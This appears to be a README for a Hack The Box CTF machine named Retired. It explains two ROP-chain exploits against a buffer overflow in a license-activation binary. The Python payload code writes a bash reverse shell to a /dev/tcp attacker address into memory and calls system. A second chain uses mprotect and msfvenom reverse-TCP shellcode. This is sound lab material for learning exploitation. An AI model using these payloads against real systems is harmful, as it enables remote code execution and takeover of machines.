# Hack The Box. Machines. Retired

Machine write-up: https://7rocky.github.io/en/htb/retired

### `first_exploit.py`

The [write-up](https://7rocky.github.io/en/htb/retired/#exploit-development) provides the needed information to exploit the Buffer Overflow vulnerability of the corresponding binary. 

### `second_exploit.py`

This exploit uses a "write-what-where" primitive to store a reverse shell command as a string in a writable address space. To learn about the context of this exploit, you can read the [write-up](https://7rocky.github.io/en/htb/retired/#analyzing-activate_license).

To do so, we use gadgets `pop rax; ret` and `pop rdi; ret` to store a writable address and a piece of the command string (8 bytes), and then we perform the write operation with gadget `mov qword ptr [rax], rdi; ret`.

We can use this technique because we have got the base address of Glibc, which has a ton of useful gadgets.

This is the function that crafts the payload:

```python
def craft_payload(pid):
    elf_address, glibc_address, stack_addr = get_addresses(pid)

    pop_rax_ret = glibc_address + 0x3ee88
    pop_rdi_ret = glibc_address + 0x26796
    mov_qword_ptr_rax_rdi_ret = glibc_address + 0x8a0eb

    system_addr = glibc_address + 0x48e50

    writable_addr = elf_address + 0x04000

    offset = 520
    junk = b'A' * offset

    payload  = junk
    payload += p64(pop_rdi_ret) + b'bash -c '
    payload += p64(pop_rax_ret) + p64(writable_addr)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b"'bash -i"
    payload += p64(pop_rax_ret) + p64(writable_addr +  8)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b' >& /dev'
    payload += p64(pop_rax_ret) + p64(writable_addr + 16)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b'/tcp/10.'
    payload += p64(pop_rax_ret) + p64(writable_addr + 24)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b'10.17.44'
    payload += p64(pop_rax_ret) + p64(writable_addr + 32)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b'/4444 0>'
    payload += p64(pop_rax_ret) + p64(writable_addr + 40)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + b"&1'    \0"
    payload += p64(pop_rax_ret) + p64(writable_addr + 48)
    payload += p64(mov_qword_ptr_rax_rdi_ret)
    payload += p64(pop_rdi_ret) + p64(writable_addr)
    payload += p64(system_addr)

    return {'licensefile': ('tmp_name', payload)}
```

It takes base addresses from a function called `get_addresses` that receives the corresponding PID of the program. Then it starts creating the payload by setting the junk data, then performing the storage of the reverse shell command in blocks of 8 bytes and finally it calls `system` providing the address of the command string as first argument.

### `third_exploit.py`

This exploit uses `mprotect` to modify the permissions of the stack and set it as executable in order to enter shellcode on the stack an execute it to obtain a reverse shell. To learn about the context of this exploit, you can read the [write-up](https://7rocky.github.io/en/htb/retired/#analyzing-activate_license).

`mprotect` receives three arguments: the start of the stack address space, the length of the stack address space and the permissions to be set (`7` for `rwx`). Hence, we will use gadgets `pop rdi; ret`, `pop rsi; ret` and `pop rdx; ret` to set the three registers that will contain the values of the arguments passed to `mprotect`.

Once that's done and `mprotect` has been called, the stack will be executable. In order to let the execution flow go to the stack, we must enter the address of an instruction like `jmp rsp`. It can't be found in Glibc or in the binary. However, there's a gadget that does pretty much the same, which is `push rsp; ret`.

Once the instruction pointer is at the stack, the shellcode will be executed and we will get a reverse shell.

This is the function that crafts the payload:

```python
def craft_payload(pid, shellcode):
    elf_addr, glibc_addr, stack_addr = get_addresses(pid)

    pop_rdi_ret   = glibc_addr + 0x26796
    pop_rsi_ret   = glibc_addr + 0x2890f
    pop_rdx_ret   = glibc_addr + 0xcb1cd
    push_rsp_ret  = glibc_addr + 0x3afc9
    mprotect_addr = glibc_addr + 0xf8c20

    offset = 520
    junk = b'A' * offset

    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(stack_addr)
    payload += p64(pop_rsi_ret)
    payload += p64(0x21000)
    payload += p64(pop_rdx_ret)
    payload += p64(0b111)
    payload += p64(mprotect_addr)
    payload += p64(push_rsp_ret)
    payload += shellcode

    return {'licensefile': ('tmp_name', payload)}
```

It takes base addresses from a function called `get_addresses` that receives the corresponding PID of the program. Then it starts creating the payload by setting the junk data, then performing the call to `mprotect` and then jumping to the shellcode on the stack.

Notice that this shellcode can be built with `msfvenom` like this:

```console
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Saved as: shellcode.bin
```
